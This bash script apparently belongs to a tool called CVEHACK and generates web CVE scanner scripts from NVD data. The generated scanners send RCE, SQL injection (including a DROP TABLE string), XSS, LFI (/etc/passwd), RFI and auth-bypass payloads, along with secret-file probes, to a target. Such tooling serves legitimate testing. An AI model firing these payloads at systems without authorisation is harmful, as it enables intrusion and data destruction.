#!/bin/bash

# ============================================================================
# Web CVE Scanner Generator for CVEHACK
# ============================================================================

# Source required libraries
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../lib/colors.sh"
source "$SCRIPT_DIR/../../lib/logger.sh"

# ============================================================================
# Web CVE Scanner Template Generator
# ============================================================================

generate_web_cve_scanner() {
    local cve_id="$1"
    local cve_data_file="$2"
    local output_file="$3"
    
    if [[ ! -f "$cve_data_file" ]]; then
        print_error "CVE data file not found: $cve_data_file"
        return 1
    fi
    
    print_info "Generating web CVE scanner for $cve_id..."
    
    # Extract CVE information
    local description=""
    local cvss_score=""
    local references=""
    local affected_products=""
    
    if command -v jq &> /dev/null; then
        description=$(jq -r '.vulnerabilities[0].cve.descriptions[0].value' "$cve_data_file" 2>/dev/null)
        cvss_score=$(jq -r '.vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseScore // .vulnerabilities[0].cve.metrics.cvssMetricV2[0].cvssData.baseScore // "N/A"' "$cve_data_file" 2>/dev/null)
        references=$(jq -r '.vulnerabilities[0].cve.references[] | .url' "$cve_data_file" 2>/dev/null | head -3 | tr '\n' ' ')
        affected_products=$(jq -r '.vulnerabilities[0].cve.configurations.nodes[]?.cpeMatch[]?.criteria' "$cve_data_file" 2>/dev/null | head -5 | tr '\n' ' ')
    fi
    
    # Determine scanner type based on CVE description
    local scanner_type=$(determine_web_scanner_type "$description")
    
    # Generate the scanner script
    cat > "$output_file" << EOF
#!/bin/bash

# ============================================================================
# Auto-generated Web CVE Scanner for $cve_id
# Generated by CVEHACK Web CVE Generator on $(date)
# ============================================================================

CVE_ID="$cve_id"
DESCRIPTION="$description"
CVSS_SCORE="$cvss_score"
SCANNER_TYPE="$scanner_type"

# References:
$(echo "$references" | sed 's/^/# /')

# Affected Products:
$(echo "$affected_products" | sed 's/^/# /')

# Source CVEHACK libraries
SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
source "\$SCRIPT_DIR/../../lib/colors.sh"
source "\$SCRIPT_DIR/../../lib/logger.sh"

# ============================================================================
# Scanner Functions
# ============================================================================

scan_target() {
    local target="\$1"
    
    if [[ -z "\$target" ]]; then
        print_error "Usage: \$0 <target>"
        echo ""
        echo "Description: \$DESCRIPTION"
        echo "CVSS Score: \$CVSS_SCORE"
        echo "Scanner Type: \$SCANNER_TYPE"
        exit 1
    fi
    
    section_header "Web CVE Scanner: \$CVE_ID"
    print_info "Target: \$target"
    print_info "CVSS Score: \$CVSS_SCORE"
    print_info "Scanner Type: \$SCANNER_TYPE"
    print_info "Description: \$DESCRIPTION"
    echo ""
    
    log_cve_test "\$CVE_ID" "\$target" "false" "Web CVE scan initiated"
    
    # Ensure target has protocol
    if [[ ! "\$target" =~ ^https?:// ]]; then
        if curl -s --connect-timeout 5 "https://\$target" >/dev/null 2>&1; then
            target="https://\$target"
        else
            target="http://\$target"
        fi
    fi
    
    print_success "Testing target: \$target"
    
    # Perform scanner-type specific tests
    case "\$SCANNER_TYPE" in
        "rce") test_rce_vulnerability "\$target" ;;
        "sqli") test_sql_injection "\$target" ;;
        "xss") test_xss_vulnerability "\$target" ;;
        "lfi") test_lfi_vulnerability "\$target" ;;
        "rfi") test_rfi_vulnerability "\$target" ;;
        "upload") test_upload_vulnerability "\$target" ;;
        "auth_bypass") test_auth_bypass "\$target" ;;
        "info_disclosure") test_info_disclosure "\$target" ;;
        "dos") test_dos_vulnerability "\$target" ;;
        *) test_generic_web_vulnerability "\$target" ;;
    esac
    
    print_info "CVE scan completed for \$CVE_ID"
}

# ============================================================================
# Vulnerability-Specific Test Functions
# ============================================================================

test_rce_vulnerability() {
    local target="\$1"
    
    print_info "Testing for Remote Code Execution (RCE) vulnerability..."
    
    # Common RCE test payloads
    local rce_payloads=(
        "system('whoami')"
        "exec('id')"
        "\$(whoami)"
        "\`id\`"
        "eval('phpinfo()')"
        "shell_exec('uname -a')"
    )
    
    local vulnerable=false
    
    for payload in "\${rce_payloads[@]}"; do
        print_info "Testing RCE payload: \$payload"
        
        # Test via GET parameter
        local encoded_payload=\$(echo "\$payload" | sed 's/ /%20/g' | sed 's/(/%28/g' | sed 's/)/%29/g')
        local test_url="\$target?cmd=\$encoded_payload"
        
        local response=\$(curl -s "\$test_url" 2>/dev/null)
        
        # Check for command execution indicators
        if echo "\$response" | grep -qiE "uid=|gid=|root|www-data|apache|nginx|system|kernel"; then
            print_error "Potential RCE vulnerability detected!"
            print_warning "Payload: \$payload"
            print_warning "Response contains system information"
            
            log_vulnerability "Remote Code Execution" "CRITICAL" "\$target" "RCE vulnerability detected with payload: \$payload" "Response: \$(echo "\$response" | head -3)"
            vulnerable=true
            break
        fi
        
        # Test via POST parameter
        local post_response=\$(curl -s -d "cmd=\$payload" "\$target" 2>/dev/null)
        
        if echo "\$post_response" | grep -qiE "uid=|gid=|root|www-data|apache|nginx|system|kernel"; then
            print_error "Potential RCE vulnerability detected via POST!"
            print_warning "Payload: \$payload"
            
            log_vulnerability "Remote Code Execution" "CRITICAL" "\$target" "RCE vulnerability detected via POST with payload: \$payload" "Response: \$(echo "\$post_response" | head -3)"
            vulnerable=true
            break
        fi
        
        sleep 1 # Rate limiting
    done
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious RCE vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "RCE tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "RCE vulnerability detected"
    fi
}

test_sql_injection() {
    local target="\$1"
    
    print_info "Testing for SQL Injection vulnerability..."
    
    # SQL injection test payloads
    local sqli_payloads=(
        "'"
        "1' OR '1'='1"
        "1\" OR \"1\"=\"1"
        "'; DROP TABLE users; --"
        "1' UNION SELECT NULL--"
        "1' AND SLEEP(5)--"
    )
    
    local vulnerable=false
    
    for payload in "\${sqli_payloads[@]}"; do
        print_info "Testing SQL injection payload: \$payload"
        
        local encoded_payload=\$(echo "\$payload" | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/"/%22/g')
        local test_url="\$target?id=\$encoded_payload"
        
        local response=\$(curl -s "\$test_url" 2>/dev/null)
        
        # Check for SQL error messages
        if echo "\$response" | grep -qiE "sql|mysql|oracle|postgresql|sqlite|syntax error|mysql_fetch|ORA-|PostgreSQL"; then
            print_error "Potential SQL injection vulnerability detected!"
            print_warning "Payload: \$payload"
            print_warning "SQL error messages found in response"
            
            log_vulnerability "SQL Injection" "HIGH" "\$target" "SQL injection vulnerability detected with payload: \$payload" "Response contains SQL errors"
            vulnerable=true
            break
        fi
        
        sleep 1
    done
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious SQL injection vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "SQL injection tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "SQL injection vulnerability detected"
    fi
}

test_xss_vulnerability() {
    local target="\$1"
    
    print_info "Testing for Cross-Site Scripting (XSS) vulnerability..."
    
    # XSS test payloads
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "javascript:alert('XSS')"
        "'\"><script>alert('XSS')</script>"
    )
    
    local vulnerable=false
    
    for payload in "\${xss_payloads[@]}"; do
        print_info "Testing XSS payload: \$payload"
        
        local encoded_payload=\$(echo "\$payload" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g')
        local test_url="\$target?q=\$encoded_payload"
        
        local response=\$(curl -s "\$test_url" 2>/dev/null)
        
        # Check if payload is reflected
        if echo "\$response" | grep -qF "\$payload"; then
            print_error "Potential XSS vulnerability detected!"
            print_warning "Payload: \$payload"
            print_warning "Payload reflected in response"
            
            log_vulnerability "Cross-Site Scripting" "MEDIUM" "\$target" "XSS vulnerability detected with payload: \$payload" "Payload reflected in response"
            vulnerable=true
            break
        fi
        
        sleep 1
    done
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious XSS vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "XSS tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "XSS vulnerability detected"
    fi
}

test_lfi_vulnerability() {
    local target="\$1"
    
    print_info "Testing for Local File Inclusion (LFI) vulnerability..."
    
    # LFI test payloads
    local lfi_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "/etc/passwd"
        "php://filter/read=convert.base64-encode/resource=index.php"
    )
    
    local vulnerable=false
    
    for payload in "\${lfi_payloads[@]}"; do
        print_info "Testing LFI payload: \$payload"
        
        local encoded_payload=\$(echo "\$payload" | sed 's/\//%2F/g' | sed 's/\\\\/%5C/g')
        local test_url="\$target?file=\$encoded_payload"
        
        local response=\$(curl -s "\$test_url" 2>/dev/null)
        
        # Check for file inclusion indicators
        if echo "\$response" | grep -qE "root:|daemon:|bin:|sys:|www-data:|apache:|nginx:"; then
            print_error "Potential LFI vulnerability detected!"
            print_warning "Payload: \$payload"
            print_warning "System file contents detected in response"
            
            log_vulnerability "Local File Inclusion" "HIGH" "\$target" "LFI vulnerability detected with payload: \$payload" "System file contents in response"
            vulnerable=true
            break
        fi
        
        sleep 1
    done
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious LFI vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "LFI tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "LFI vulnerability detected"
    fi
}

test_rfi_vulnerability() {
    local target="\$1"
    
    print_info "Testing for Remote File Inclusion (RFI) vulnerability..."
    
    # RFI test payloads (using safe external resources)
    local rfi_payloads=(
        "http://httpbin.org/robots.txt"
        "https://httpbin.org/robots.txt"
        "ftp://ftp.example.com/test.txt"
    )
    
    local vulnerable=false
    
    for payload in "\${rfi_payloads[@]}"; do
        print_info "Testing RFI payload: \$payload"
        
        local test_url="\$target?file=\$payload"
        
        local response=\$(curl -s "\$test_url" 2>/dev/null)
        
        # Check for remote file inclusion
        if echo "\$response" | grep -qE "User-agent:|Disallow:|robots.txt"; then
            print_error "Potential RFI vulnerability detected!"
            print_warning "Payload: \$payload"
            print_warning "Remote file content detected in response"
            
            log_vulnerability "Remote File Inclusion" "HIGH" "\$target" "RFI vulnerability detected with payload: \$payload" "Remote file content in response"
            vulnerable=true
            break
        fi
        
        sleep 1
    done
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious RFI vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "RFI tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "RFI vulnerability detected"
    fi
}

test_upload_vulnerability() {
    local target="\$1"
    
    print_info "Testing for file upload vulnerability..."
    
    # Look for upload forms or endpoints
    local response=\$(curl -s "\$target" 2>/dev/null)
    
    if echo "\$response" | grep -qiE "upload|file.*input|enctype.*multipart"; then
        print_warning "File upload functionality detected"
        print_info "Manual testing recommended for upload vulnerabilities"
        
        log_vulnerability "File Upload" "MEDIUM" "\$target" "File upload functionality detected" "Upload form found in response"
        log_cve_test "\$CVE_ID" "\$target" "potential" "File upload functionality detected"
    else
        print_success "No obvious file upload functionality detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "No file upload functionality found"
    fi
}

test_auth_bypass() {
    local target="\$1"
    
    print_info "Testing for authentication bypass vulnerability..."
    
    # Common auth bypass techniques
    local bypass_payloads=(
        "admin'--"
        "admin'/*"
        "' OR '1'='1"
        "' OR 1=1--"
        "admin' OR '1'='1'--"
    )
    
    local vulnerable=false
    
    # Check if there's a login form
    local login_response=\$(curl -s "\$target/login" 2>/dev/null)
    if [[ -z "\$login_response" ]]; then
        login_response=\$(curl -s "\$target" 2>/dev/null)
    fi
    
    if echo "\$login_response" | grep -qiE "password|login|signin"; then
        print_info "Login functionality detected, testing bypass techniques..."
        
        for payload in "\${bypass_payloads[@]}"; do
            print_info "Testing auth bypass payload: \$payload"
            
            local login_attempt=\$(curl -s -d "username=\$payload&password=test" "\$target/login" 2>/dev/null)
            
            if echo "\$login_attempt" | grep -qiE "dashboard|welcome|logout|admin|profile" && ! echo "\$login_attempt" | grep -qiE "invalid|error|failed"; then
                print_error "Potential authentication bypass detected!"
                print_warning "Payload: \$payload"
                
                log_vulnerability "Authentication Bypass" "HIGH" "\$target" "Auth bypass vulnerability detected with payload: \$payload" "Successful login bypass"
                vulnerable=true
                break
            fi
            
            sleep 1
        done
    else
        print_info "No login functionality detected"
    fi
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious authentication bypass vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "Auth bypass tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "Authentication bypass vulnerability detected"
    fi
}

test_info_disclosure() {
    local target="\$1"
    
    print_info "Testing for information disclosure vulnerability..."
    
    # Common info disclosure paths
    local info_paths=(
        "/.env"
        "/config.php"
        "/wp-config.php"
        "/database.php"
        "/.git/config"
        "/phpinfo.php"
        "/info.php"
        "/server-status"
        "/server-info"
    )
    
    local vulnerable=false
    
    for path in "\${info_paths[@]}"; do
        print_info "Testing info disclosure path: \$path"
        
        local test_url="\$target\$path"
        local response=\$(curl -s -o /dev/null -w "%{http_code}" "\$test_url" 2>/dev/null)
        
        if [[ "\$response" == "200" ]]; then
            local content=\$(curl -s "\$test_url" 2>/dev/null)
            
            if echo "\$content" | grep -qiE "password|database|secret|key|token|config"; then
                print_error "Information disclosure detected!"
                print_warning "Path: \$path"
                print_warning "Sensitive information may be exposed"
                
                log_vulnerability "Information Disclosure" "MEDIUM" "\$target" "Info disclosure at path: \$path" "Sensitive information detected"
                vulnerable=true
            fi
        fi
        
        sleep 1
    done
    
    if [[ "\$vulnerable" == "false" ]]; then
        print_success "No obvious information disclosure detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "Info disclosure tests completed - no vulnerability detected"
    else
        log_cve_test "\$CVE_ID" "\$target" "true" "Information disclosure vulnerability detected"
    fi
}

test_dos_vulnerability() {
    local target="\$1"
    
    print_info "Testing for Denial of Service (DoS) vulnerability..."
    print_warning "DoS testing is limited to prevent service disruption"
    
    # Mild DoS test - check response times
    local normal_time=\$(curl -s -w "%{time_total}" -o /dev/null "\$target" 2>/dev/null)
    
    # Test with large payload
    local large_payload=\$(printf 'A%.0s' {1..10000})
    local dos_time=\$(curl -s -w "%{time_total}" -o /dev/null -d "data=\$large_payload" "\$target" 2>/dev/null)
    
    # Compare response times
    if (( \$(echo "\$dos_time > \$normal_time * 3" | bc -l) )); then
        print_warning "Potential DoS vulnerability detected"
        print_info "Response time increased significantly with large payload"
        
        log_vulnerability "Denial of Service" "MEDIUM" "\$target" "Potential DoS vulnerability - response time anomaly" "Normal: \${normal_time}s, Large payload: \${dos_time}s"
        log_cve_test "\$CVE_ID" "\$target" "potential" "DoS vulnerability potential detected"
    else
        print_success "No obvious DoS vulnerability detected"
        log_cve_test "\$CVE_ID" "\$target" "false" "DoS tests completed - no vulnerability detected"
    fi
}

test_generic_web_vulnerability() {
    local target="\$1"
    
    print_info "Performing generic web vulnerability assessment..."
    
    # Basic connectivity and response analysis
    local response=\$(curl -s -I "\$target" 2>/dev/null)
    
    if [[ -n "\$response" ]]; then
        print_success "Target is accessible"
        
        # Check server information
        local server=\$(echo "\$response" | grep -i "server:" | cut -d: -f2- | xargs)
        if [[ -n "\$server" ]]; then
            print_info "Server: \$server"
        fi
        
        # Check for security headers
        local security_headers=("X-Frame-Options" "X-XSS-Protection" "X-Content-Type-Options" "Strict-Transport-Security")
        
        for header in "\${security_headers[@]}"; do
            if echo "\$response" | grep -qi "\$header:"; then
                print_success "Security header present: \$header"
            else
                print_warning "Missing security header: \$header"
                log_vulnerability "Missing Security Header" "LOW" "\$target" "Missing security header: \$header" "Security header not found"
            fi
        done
        
        # Basic content analysis
        local content=\$(curl -s "\$target" 2>/dev/null)
        
        if echo "\$content" | grep -qiE "error|exception|stack trace|debug"; then
            print_warning "Error information detected in response"
            log_vulnerability "Information Disclosure" "LOW" "\$target" "Error information in response" "Debug/error information detected"
        fi
        
        log_cve_test "\$CVE_ID" "\$target" "tested" "Generic web vulnerability assessment completed"
    else
        print_error "Target is not accessible"
        log_cve_test "\$CVE_ID" "\$target" "false" "Target not accessible"
    fi
}

# ============================================================================
# Main Execution
# ============================================================================

if [[ "\${BASH_SOURCE[0]}" == "\${0}" ]]; then
    scan_target "\$1"
fi
EOF

    chmod +x "$output_file"
    print_success "Web CVE scanner generated: $output_file"
    
    echo "$output_file"
}

# ============================================================================
# Scanner Type Determination
# ============================================================================

determine_web_scanner_type() {
    local description="$1"
    local desc_lower=$(echo "$description" | tr '[:upper:]' '[:lower:]')
    
    # Determine scanner type based on CVE description keywords
    if echo "$desc_lower" | grep -qE "remote code execution|rce|command injection|code injection"; then
        echo "rce"
    elif echo "$desc_lower" | grep -qE "sql injection|sqli|database"; then
        echo "sqli"
    elif echo "$desc_lower" | grep -qE "cross-site scripting|xss|script injection"; then
        echo "xss"
    elif echo "$desc_lower" | grep -qE "local file inclusion|lfi|file inclusion|directory traversal"; then
        echo "lfi"
    elif echo "$desc_lower" | grep -qE "remote file inclusion|rfi"; then
        echo "rfi"
    elif echo "$desc_lower" | grep -qE "file upload|upload"; then
        echo "upload"
    elif echo "$desc_lower" | grep -qE "authentication bypass|auth bypass|login bypass"; then
        echo "auth_bypass"
    elif echo "$desc_lower" | grep -qE "information disclosure|info disclosure|sensitive information"; then
        echo "info_disclosure"
    elif echo "$desc_lower" | grep -qE "denial of service|dos|resource exhaustion"; then
        echo "dos"
    else
        echo "generic"
    fi
}

# ============================================================================
# Main Function
# ============================================================================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 3 ]]; then
        echo "Usage: $0 <cve_id> <cve_data_file> <output_file>"
        exit 1
    fi
    
    generate_web_cve_scanner "$1" "$2" "$3"
fi
